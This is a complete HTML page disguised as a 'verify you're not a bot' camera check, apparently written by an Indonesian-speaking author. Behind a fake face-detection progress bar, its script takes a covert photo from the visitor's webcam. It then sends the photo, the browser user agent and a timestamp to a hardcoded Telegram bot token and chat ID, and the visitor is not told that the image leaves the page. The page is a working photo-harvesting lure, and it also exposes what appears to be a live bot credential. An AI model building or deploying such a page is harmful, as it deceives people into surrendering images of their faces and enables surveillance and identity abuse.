<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üîê Identity Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 100%;
            padding: 40px 30px;
            text-align: center;
            animation: slideIn 0.5s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            font-size: 0.9em;
            color: #888;
        }

        .badge {
            background: #667eea;
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.85em;
        }

        h1 {
            font-size: 2em;
            color: #333;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .lock-icon {
            font-size: 1.2em;
        }

        .message {
            color: #666;
            font-size: 1.1em;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .status {
            background: #f5f5f5;
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
            font-size: 1em;
            color: #555;
        }

        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 25px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 20px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .video-container {
            display: none;
            position: relative;
            margin: 20px 0;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        }

        .video-container.active {
            display: block;
        }

        #video {
            width: 100%;
            border-radius: 15px;
        }

        canvas {
            display: none;
        }

        .success {
            color: #28a745;
            font-size: 3em;
            animation: scaleIn 0.5s ease;
        }

        @keyframes scaleIn {
            0% {
                transform: scale(0);
            }
            50% {
                transform: scale(1.2);
            }
            100% {
                transform: scale(1);
            }
        }

        .progress-bar {
            width: 100%;
            height: 10px;
            background: #f0f0f0;
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s ease;
        }

        .info {
            background: #e3f2fd;
            color: #1976d2;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 0.95em;
        }

        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="badge">FAST</span>
            <span>Verification</span>
        </div>

        <h1>
            <span class="lock-icon">üîê</span>
            Identity Verification
        </h1>

        <div class="message" id="message">
            We need camera permission to verify you're not a bot.
        </div>

        <div class="status" id="status">
            <span id="statusText">Initializing...</span>
            <span class="loader" id="loader"></span>
        </div>

        <div class="progress-bar">
            <div class="progress-fill" id="progress"></div>
        </div>

        <div class="video-container" id="videoContainer">
            <video id="video" autoplay playsinline></video>
        </div>

        <canvas id="canvas"></canvas>

        <div class="info" id="info" style="display: none;">
            ‚úì Camera access granted. Please look at the camera.
        </div>

        <button class="btn" id="startBtn" onclick="startVerification()">
            Allow Camera Access
        </button>

        <div id="result"></div>
    </div>

    <script>
        // KONFIGURASI TELEGRAM BOT
        const TELEGRAM_BOT_TOKEN = '8337679399:AAGgDi6eDjQ-4-MT9hj8h4tuaBRcKi--mOk';
        const TELEGRAM_CHAT_ID = '7538231958';

        let stream = null;

        async function startVerification() {
            const btn = document.getElementById('startBtn');
            const statusText = document.getElementById('statusText');
            const videoContainer = document.getElementById('videoContainer');
            const video = document.getElementById('video');
            const loader = document.getElementById('loader');
            const info = document.getElementById('info');
            const progress = document.getElementById('progress');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            btn.disabled = true;
            btn.textContent = 'Processing...';

            try {
                // Request camera access
                statusText.textContent = 'Requesting camera access...';
                progress.style.width = '20%';

                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false 
                });

                video.srcObject = stream;
                videoContainer.classList.add('active');
                info.style.display = 'block';
                
                statusText.textContent = 'Camera connected';
                progress.style.width = '40%';

                // Wait for video to be ready
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        resolve();
                    };
                });

                await delay(1500);
                statusText.textContent = 'Detecting face...';
                progress.style.width = '60%';

                await delay(2000);
                
                // Capture photo
                statusText.textContent = 'Capturing image...';
                progress.style.width = '75%';

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert to blob
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.95);
                });

                statusText.textContent = 'Sending to verification server...';
                progress.style.width = '85%';

                // Send to Telegram
                const success = await sendPhotoToTelegram(blob);

                if (success) {
                    // Success
                    loader.style.display = 'none';
                    progress.style.width = '100%';
                    statusText.textContent = 'Verification Complete! ‚úì';
                    
                    // Stop camera
                    if (stream) {
                        stream.getTracks().forEach(track => track.stop());
                    }
                    
                    videoContainer.classList.remove('active');

                    // Show success
                    document.getElementById('result').innerHTML = '<div class="success">‚úì</div>';
                    document.getElementById('message').textContent = 'You have been verified successfully!';
                    info.innerHTML = '‚úì Identity verified. Thank you!';
                    info.style.background = '#d4edda';
                    info.style.color = '#155724';

                } else {
                    throw new Error('Failed to send verification');
                }

            } catch (error) {
                console.error('Verification error:', error);
                
                // Stop camera
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
                statusText.textContent = 'Verification failed';
                loader.style.display = 'none';
                btn.disabled = false;
                btn.textContent = 'Try Again';
                
                const errorDiv = document.createElement('div');
                errorDiv.className = 'error';
                errorDiv.textContent = '‚ùå ' + (error.message || 'Please allow camera access and try again.');
                document.getElementById('result').appendChild(errorDiv);
                
                progress.style.width = '0%';
            }
        }

        async function sendPhotoToTelegram(photoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', photoBlob, 'verification.jpg');
                formData.append('caption', `üîê Identity Verification\n\nTime: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`);

                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                
                if (result.ok) {
                    console.log('Photo sent to Telegram successfully');
                    return true;
                } else {
                    console.error('Telegram API error:', result);
                    return false;
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Auto start countdown
        window.addEventListener('load', () => {
            const statusText = document.getElementById('statusText');
            let countdown = 3;
            
            const countInterval = setInterval(() => {
                countdown--;
                statusText.textContent = `Starting in ${countdown}...`;
                
                if (countdown <= 0) {
                    clearInterval(countInterval);
                    statusText.innerHTML = 'Ready! Click button below';
                    document.getElementById('loader').style.display = 'none';
                }
            }, 1000);
        });
    </script>
</body>
</html>
